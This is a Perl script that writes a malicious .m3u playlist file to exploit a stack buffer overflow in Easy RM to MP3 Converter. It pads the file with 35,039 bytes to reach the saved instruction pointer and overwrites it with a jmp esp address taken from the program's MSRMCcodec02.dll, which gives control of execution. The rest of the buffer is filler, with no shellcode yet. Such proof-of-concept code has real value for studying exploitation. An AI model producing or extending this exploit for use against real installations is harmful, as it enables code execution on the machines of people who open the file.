#!/usr/bin/perl

my $buffsize = 50000; # sets buffer size for consistent sized payload

my $junk = "\x41" x 35039; # offset to eip overwrite
my $eip = pack('V', 0x01AAF23A); # jmp esp C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll
my $sploit = $junk.$eip; # build the exploit portion of the buffer
my $fill = "\x43" x ($buffsize - length($sploit)); # fill the remainder of the buffer
my $buffer = $sploit.$fill; # build the final buffer

# write the exploit buffer to file
my $file = "asx2mp3.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
